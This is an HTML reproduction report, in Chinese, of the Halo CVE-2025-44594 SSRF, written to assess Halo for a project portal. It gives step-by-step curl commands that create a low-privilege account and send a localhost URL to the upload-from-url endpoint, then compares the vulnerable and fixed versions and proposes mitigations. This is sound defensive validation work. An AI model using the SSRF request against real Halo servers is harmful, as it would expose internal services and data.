@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Halo CVE-2025-44594 本地复现报告</title>
+<style>
+  :root{
+    --bg:#f6f7f9; --panel:#ffffff; --ink:#1b1f24; --ink-2:#4a535e; --ink-3:#7a848f;
+    --line:#e3e6ea; --brand:#2f6bd8; --brand-soft:#eef3fd;
+    --red:#c0392b; --red-soft:#fdeeec; --green:#1f7a4d; --green-soft:#eaf6f0;
+    --amber:#9a6200; --amber-soft:#fdf5e6; --mono:"Cascadia Mono",Consolas,"SF Mono",Menlo,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;
+    line-height:1.7;font-size:15px}
+  .wrap{max-width:1000px;margin:0 auto;padding:40px 28px 80px}
+  header{border-bottom:2px solid var(--ink);padding-bottom:18px;margin-bottom:28px}
+  .kicker{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--ink-3);font-weight:700}
+  h1{font-size:30px;line-height:1.3;margin:8px 0 10px;letter-spacing:-.01em}
+  .sub{color:var(--ink-2);font-size:14px}
+  .badges{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+  .badge{font-size:12px;padding:3px 10px;border-radius:20px;border:1px solid var(--line);background:#fff;color:var(--ink-2)}
+  .badge.ok{background:var(--green-soft);border-color:#cfe8db;color:var(--green);font-weight:600}
+  .badge.warn{background:var(--amber-soft);border-color:#f0dfbc;color:var(--amber);font-weight:600}
+  .badge.danger{background:var(--red-soft);border-color:#f5d3ce;color:var(--red);font-weight:600}
+  h2{font-size:19px;margin:38px 0 12px;padding-left:11px;border-left:4px solid var(--brand)}
+  h3{font-size:15px;margin:22px 0 8px;color:var(--ink)}
+  p{margin:8px 0}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px 20px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .kv{display:grid;grid-template-columns:130px 1fr;gap:6px 14px;font-size:14px}
+  .kv dt{color:var(--ink-3)}
+  .kv dd{margin:0;color:var(--ink);word-break:break-all}
+  table{width:100%;border-collapse:collapse;font-size:13.5px;background:#fff;
+    border:1px solid var(--line);border-radius:8px;overflow:hidden}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{background:#fafbfc;color:var(--ink-2);font-weight:600;font-size:12.5px}
+  tr:last-child td{border-bottom:none}
+  code{font-family:var(--mono);font-size:12.5px;background:#f2f4f7;padding:1px 5px;border-radius:4px}
+  pre{background:#151a21;color:#e6e9ee;padding:14px 16px;border-radius:8px;overflow:auto;
+    font-family:var(--mono);font-size:12.5px;line-height:1.6;margin:10px 0}
+  pre .c{color:#8b97a6}
+  pre .g{color:#7ee2a8}
+  pre .r{color:#ff8a7a}
+  pre .y{color:#ffd479}
+  .res{display:flex;gap:12px;align-items:flex-start;padding:13px 15px;border-radius:8px;margin:10px 0;font-size:14px}
+  .res.vuln{background:var(--red-soft);border:1px solid #f5d3ce}
+  .res.fix{background:var(--green-soft);border:1px solid #cfe8db}
+  .res .tag{font-weight:700;font-size:12px;letter-spacing:.06em;white-space:nowrap}
+  .res.vuln .tag{color:var(--red)} .res.fix .tag{color:var(--green)}
+  figure{margin:14px 0;background:#fff;border:1px solid var(--line);border-radius:10px;padding:10px}
+  figure img{width:100%;display:block;border-radius:6px}
+  figcaption{font-size:12.5px;color:var(--ink-3);padding:8px 4px 2px}
+  .note{background:var(--brand-soft);border:1px solid #d8e4fb;border-radius:8px;padding:12px 15px;font-size:13.5px;color:#24457f}
+  .warn-box{background:var(--amber-soft);border:1px solid #f0dfbc;border-radius:8px;padding:12px 15px;font-size:13.5px;color:#6b4400}
+  ol{padding-left:22px} ol li{margin:9px 0}
+  .step{background:#fff;border:1px solid var(--line);border-radius:8px;padding:12px 16px;margin:10px 0}
+  .step .no{display:inline-block;width:22px;height:22px;line-height:22px;text-align:center;
+    background:var(--brand);color:#fff;border-radius:50%;font-size:12px;font-weight:700;margin-right:8px}
+  footer{margin-top:46px;padding-top:16px;border-top:1px solid var(--line);color:var(--ink-3);font-size:12.5px}
+  .toc{font-size:13.5px;color:var(--ink-2)}
+  .toc a{color:var(--brand);text-decoration:none}
+  @media (max-width:720px){.grid{grid-template-columns:1fr}.kv{grid-template-columns:110px 1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="kicker">Security Reproduction Report / Local Lab Only</div>
+  <h1>Halo <span style="color:var(--brand)">CVE-2025-44594</span> 服务端请求伪造（SSRF）本地复现</h1>
+  <div class="sub">针对成果展示广场选型候选「Halo」的已披露漏洞验证 · 2.24.0 触发 / 2.24.1 阻断对照</div>
+  <div class="badges">
+    <span class="badge ok">已稳定复现</span>
+    <span class="badge danger">CVSS 6.5 Medium</span>
+    <span class="badge">CWE-918</span>
+    <span class="badge">影响 &le; 2.24.0</span>
+    <span class="badge">修复 2.24.1</span>
+    <span class="badge warn">仅回连 127.0.0.1，无外部目标</span>
+  </div>
+</header>
+
+<div class="card toc">
+  <strong>目录</strong> ·
+  <a href="#s1">1 漏洞信息</a> ·
+  <a href="#s2">2 环境与依赖</a> ·
+  <a href="#s3">3 前置条件</a> ·
+  <a href="#s4">4 复现步骤</a> ·
+  <a href="#s5">5 证据</a> ·
+  <a href="#s6">6 修复对照</a> ·
+  <a href="#s7">7 根因</a> ·
+  <a href="#s8">8 对项目的影响</a>
+</div>
+
+<h2 id="s1">1. 漏洞信息</h2>
+<table>
+  <tr><th style="width:150px">项目</th><th>内容</th></tr>
+  <tr><td>编号</td><td>CVE-2025-44594 / GHSA-5qw7-wc23-wpmm</td></tr>
+  <tr><td>类型</td><td>Server-Side Request Forgery（CWE-918）</td></tr>
+  <tr><td>严重度</td><td>Medium，CVSS 3.1 = 6.5（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N）</td></tr>
+  <tr><td>影响版本</td><td>Halo &le; 2.24.0</td></tr>
+  <tr><td>修复版本</td><td>Halo 2.24.1（PR #9904）</td></tr>
+  <tr><td>受影响接口</td><td><code>POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url</code></td></tr>
+  <tr><td>所需权限</td><td><code>role-template-uc-attachment-manager</code>（UC 附件管理，非管理员）</td></tr>
+  <tr><td>公告时间</td><td>2026-05-04（GHSA 发布）</td></tr>
+</table>
+<p style="margin-top:10px">该漏洞的成因是：UC 附件「从 URL 上传」功能允许用户提交任意 URL，服务端在抓取时未限制回环地址与私网地址，导致攻击者可以让 Halo 服务器向内网服务发起请求，并把响应内容作为附件落盘、再通过静态地址读回。</p>
+
+<h2 id="s2">2. 环境与依赖版本</h2>
+<div class="grid">
+  <div class="card">
+    <dl class="kv">
+      <dt>操作系统</dt><dd>Windows（win32 x64，Git Bash 执行）</dd>
+      <dt>运行时</dt><dd>Microsoft OpenJDK 21.0.13.0.2+1 LTS（便携解压，未安装）</dd>
+      <dt>应用</dt><dd>halo-2.24.0.jar（官方 Release 产物）</dd>
+      <dt>数据库</dt><dd>H2 文件库（Halo 默认配置，无外部依赖）</dd>
+      <dt>监听端口</dt><dd>8090（受影响） / 8091（修复版） / 9999（回调监听）</dd>
+      <dt>容器</dt><dd>未使用 Docker；纯进程级隔离</dd>
+    </dl>
+  </div>
+  <div class="card">
+    <dl class="kv">
+      <dt>2.24.0 SHA-256</dt><dd><code>ef56ebda…ea239b</code> ✔ 与官方 .sha256 一致</dd>
+      <dt>2.24.1 SHA-256</dt><dd><code>44342c34…e6d44d</code> ✔ 与官方 .sha256 一致</dd>
+      <dt>启动参数</dt><dd><code>--server.port</code> <code>--halo.work-dir</code> <code>--halo.security.basic-auth.disabled=false</code></dd>
+      <dt>启动耗时</dt><dd>2.24.0 约 15.5s / 2.24.1 约 15.1s</dd>
+      <dt>管理员</dt><dd>admin / Passw0rd!2026（仅本地）</dd>
+      <dt>低权账号</dt><dd>uc_repro（仅绑定 UC 附件角色）</dd>
+    </dl>
+  </div>
+</div>
+<div class="note" style="margin-top:12px">
+  <strong>为什么开 Basic 认证：</strong>Halo 默认 <code>halo.security.basic-auth.disabled=true</code>，关闭时脚本无法以账号身份调用 API。复现时显式置为 <code>false</code>，仅为便于自动化取证，不影响漏洞路径本身；实际攻击者通过正常登录即可获得同等会话。
+</div>
+
+<h2 id="s3">3. 前置条件</h2>
+<ol>
+  <li>Halo 已完成初始化安装（创建超级管理员）。</li>
+  <li>存在一个<strong>非管理员</strong>账号，仅被授予 UC 附件管理角色：<br>
+      <code>uc.api.storage.halo.run</code> 的 <code>attachments</code> / <code>attachments/upload-from-url</code>，动词 <code>create,list</code>。</li>
+  <li>该系统设置中已配置 UC 附件存储策略（默认 <code>default-policy</code> 即满足）。</li>
+</ol>
+<p>第 2 条是该漏洞与「普通注册用户」的边界：默认角色并不包含该权限，因此公告标注 PR:L（需低权限）。本次复现严格按此边界构造账号。</p>
+
+<h2 id="s4">4. 复现步骤（可重复）</h2>
+
+<div class="step"><span class="no">1</span><strong>启动受影响实例</strong>
+<pre><span class="c"># 工作目录 halo-lab/</span>
+java -jar jars/halo-2.24.0.jar \
+  --server.port=8090 \
+  --halo.work-dir=./work/v240 \
+  --halo.external-url=http://127.0.0.1:8090 \
+  --halo.security.basic-auth.disabled=false</pre>
+</div>
+
+<div class="step"><span class="no">2</span><strong>完成初始化</strong>
+<pre>curl -X POST http://127.0.0.1:8090/system/setup \
+  -d "username=admin&amp;password=Passw0rd!2026&amp;email=admin@halo.local" \
+  -d "siteTitle=Halo+SSRF+Lab&amp;language=zh-CN&amp;externalUrl=http://127.0.0.1:8090"
+<span class="c"># → 204 No Content</span></pre>
+</div>
+
+<div class="step"><span class="no">3</span><strong>创建最小权限角色与账号</strong>
+<pre><span class="c"># 角色：只给 UC 附件权限</span>
+curl -u admin:Passw0rd!2026 -X POST http://127.0.0.1:8090/api/v1alpha1/roles \
+  -H "Content-Type: application/json" -d '{
+  "apiVersion":"v1alpha1","kind":"Role",
+  "metadata":{"name":"repro-uc-attachment"},
+  "rules":[{"apiGroups":["uc.api.storage.halo.run"],
+            "resources":["attachments","attachments/upload","attachments/upload-from-url"],
+            "verbs":["create","list"]}]}'
+<span class="c"># → 201 Created</span>
+
+curl -u admin:Passw0rd!2026 -X POST \
+  http://127.0.0.1:8090/apis/api.console.halo.run/v1alpha1/users \
+  -H "Content-Type: application/json" -d '{
+  "name":"uc_repro","email":"uc_repro@halo.local",
+  "password":"Passw0rd!2026","roles":["repro-uc-attachment"]}'
+<span class="c"># → 200 OK</span></pre>
+</div>
+
+<div class="step"><span class="no">4</span><strong>起一个内网监听器（模拟内网服务）</strong>
+<pre>python listener.py 9999
+<span class="c"># 监听 127.0.0.1:9999，记录每次请求并返回固定标记</span>
+<span class="c"># 响应体：HALO-SSRF-CANARY-7f3a91</span></pre>
+</div>
+
+<div class="step"><span class="no">5</span><strong>以低权账号提交内网 URL</strong>
+<pre>curl -u uc_repro:'Passw0rd!2026' -X POST \
+  http://127.0.0.1:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:9999/probe","filename":"ssrf-canary.txt"}'
+<span class="g"># → 200 OK，返回 Attachment 对象</span></pre>
+</div>
+
+<div class="step"><span class="no">6</span><strong>验证副作用</strong>
+<pre><span class="c"># ① 监听器收到了来自 Halo 进程的请求</span>
+cat evidence/callback-vuln.log
+<span class="c"># ② 响应内容被落盘为附件，且可直接匿名读取</span>
+curl http://127.0.0.1:8090/upload/ssrf-canary.txt
+<span class="g">→ HALO-SSRF-CANARY-7f3a91</span></pre>
+</div>
+
+<h2 id="s5">5. 复现结果与证据</h2>
+
+<div class="res vuln">
+  <span class="tag">2.24.0</span>
+  <div>接口返回 <strong>200</strong>，附件创建成功：
+  <code>displayName=ssrf-canary.txt</code>、<code>mediaType=text/plain</code>、<code>size=24</code>、
+  <code>permalink=/upload/ssrf-canary.txt</code>，<code>ownerName=uc_repro</code>。</div>
+</div>
+
+<pre><span class="c">// 2.24.0 响应（节选）</span>
+{"apiVersion":"storage.halo.run/v1alpha1","kind":"Attachment",
+ "metadata":{"name":"69d843c0-dc56-4a02-bc56-5b75885c064b",
+   "annotations":{"storage.halo.run/uri":"/upload/ssrf-canary.txt"}},
+ "spec":{"displayName":"ssrf-canary.txt","mediaType":"text/plain;charset=utf-8",
+   "ownerName":"uc_repro","policyName":"default-policy","size":24},
+ "status":{"permalink":"/upload/ssrf-canary.txt"}}</pre>
+
+<h3>5.1 服务端确实发起了请求</h3>
+<pre><span class="c">// evidence/callback-vuln.log</span>
+2026-11-03T07:22:50.838Z  GET /probe  from 127.0.0.1  UA: <span class="y">ReactorNetty/1.3.4</span>
+2026-11-03T07:22:50.881Z  GET /probe  from 127.0.0.1  UA: <span class="y">ReactorNetty/1.3.4</span></pre>
+<p>发起方不是浏览器，而是 Halo 内嵌的 Reactor Netty 客户端；两次请求分别对应代码里的 HEAD 探测与 GET 取流（<code>dataBufferFetcher.head()</code> 与正式下载）。这说明请求由服务端进程发出，而非客户端跳转。</p>
+
+<figure>
+  <img src="evidence/shot-console-attachments.png" alt="Halo 附件库中出现 ssrf-canary.txt" />
+  <figcaption>Halo 后台「附件库」：<code>ssrf-canary.txt</code>，text/plain，24 B，本地存储，上传者 <code>uc_repro</code>，时间 2026-11-03 15:22。该文件并非用户上传，而是服务端抓取回调内容后落盘。</figcaption>
+</figure>
+
+<figure>
+  <img src="evidence/shot-public-file.png" alt="匿名访问附件地址读回标记内容" />
+  <figcaption>无需登录直接访问 <code>http://127.0.0.1:8090/upload/ssrf-canary.txt</code>，读回监听器返回的标记串，证明「请求内网 → 响应落盘 → 公开读取」的完整链路成立。</figcaption>
+</figure>
+
+<h2 id="s6">6. 修复版本对照</h2>
+<p>同一脚本、同一账号、同一 URL，仅替换 jar 为 2.24.1：</p>
+
+<div class="res fix">
+  <span class="tag">2.24.1</span>
+  <div>接口返回 <strong>400</strong>，请求在地址校验阶段被拒绝；监听器<strong>零回调</strong>，未产生任何附件。</div>
+</div>
+
+<pre><span class="c">// 2.24.1 响应</span>
+{"status":400,"title":"请求参数有误",
+ "detail":"<span class="r">Unable to resolve host or private IP resolved: Failed to resolve [/127.0.0.1:9999]</span>",
+ "instance":"http://127.0.0.1:8091/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"}
+
+<span class="c">// evidence/callback.log（修复版执行后）</span>
+<span class="g">(空 —— 服务端未发出任何请求)</span></pre>
+
+<table>
+  <tr><th>观测项</th><th>2.24.0（受影响）</th><th>2.24.1（已修复）</th></tr>
+  <tr><td>HTTP 状态</td><td style="color:var(--red);font-weight:600">200 OK</td><td style="color:var(--green);font-weight:600">400 Bad Request</td></tr>
+  <tr><td>回调监听器命中</td><td style="color:var(--red)">2 次（HEAD + GET）</td><td style="color:var(--green)">0 次</td></tr>
+  <tr><td>附件是否落盘</td><td style="color:var(--red)">是，24 B</td><td style="color:var(--green)">否</td></tr>
+  <tr><td>可匿名读回</td><td style="color:var(--red)">是，/upload/ssrf-canary.txt</td><td style="color:var(--green)">不存在</td></tr>
+</table>
+
+<h2 id="s7">7. 根因与修复方式</h2>
+<p>受影响版本的 URL 抓取实现 <code>DefaultReactiveUrlDataBufferFetcher</code> 直接构造 <code>HttpClient</code> 并开启 <code>followRedirect(true)</code>，未对目标地址做任何网段判断，因此 <code>127.0.0.1</code>、<code>10.0.0.0/8</code>、<code>169.254.0.0/16</code> 等均可命中。</p>
+<p>修复 PR #9904 引入 <code>HttpSecurityUtils.secureHttpClient()</code>，在 DNS 解析完成后通过 <code>resolvedAddressesSelector</code> 过滤连接地址，同时把 <code>followRedirect</code> 改为 <code>false</code>、增加 10s 响应超时、5s 连接超时与响应体上限。被拦截的地址类型包括：</p>
+<ul>
+  <li>回环地址（127.0.0.0/8、::1）</li>
+  <li>私网地址（10/8、172.16/12、192.168/16）</li>
+  <li>链路本地（169.254/16、fe80::/10）</li>
+  <li>组播、未指定地址、IPv6 ULA（fc00::/7）</li>
+</ul>
+
+<h2 id="s8">8. 对「成果展示广场」的影响判断</h2>
+<p>本项目把 Halo 作为展示门户基座，风险点集中在两处，且都可控：</p>
+<table>
+  <tr><th style="width:230px">风险点</th><th>说明与处置</th></tr>
+  <tr><td>版本基线</td><td>选型时直接锁定 <strong>&ge; 2.27.2</strong>（当前最新），即可同时覆盖本 SSRF、备份下载路径穿越（&le;2.24.2）、角色委派提权（&le;2.26.1）三个已披露问题。</td></tr>
+  <tr><td>权限收敛</td><td>不要给普通学员授予「UC 附件管理」。广场的作品封面走投稿表单受控上传，不开放 <code>upload-from-url</code>。</td></tr>
+  <tr><td>出网策略</td><td>容器或主机层限制 Halo 进程的出网范围，禁止访问内网段与管理端口，作为兜底。</td></tr>
+  <tr><td>历史版本不可回退</td><td>若因插件兼容被锁在 2.24.x，必须同时禁用该接口或收回该权限，不能只靠「不告诉用户」。</td></tr>
+</table>
+
+<div class="warn-box" style="margin-top:16px">
+  <strong>复现的边界声明：</strong>本次复现全程在本地 <code>127.0.0.1</code> 完成，回调地址指向自建监听器，未请求任何内网真实服务、未访问互联网目标、未读取任何文件、未做持久化驻留。所有凭据均为一次性本地测试账号，实例仅绑定本机端口。
+</div>
+
+<footer>
+  报告生成时间：2026-11-03 · 复现环境：本地隔离实例（8090 / 8091 / 9999）<br>
+  原始证据文件：<code>evidence/result-vuln.json</code>、<code>evidence/result-fixed.json</code>、<code>evidence/callback-vuln.log</code><br>
+  复现脚本：<code>repro.py</code>、<code>listener.py</code>（仓库内可直接重跑）
+</footer>
+
+</div>
+</body>
+</html>
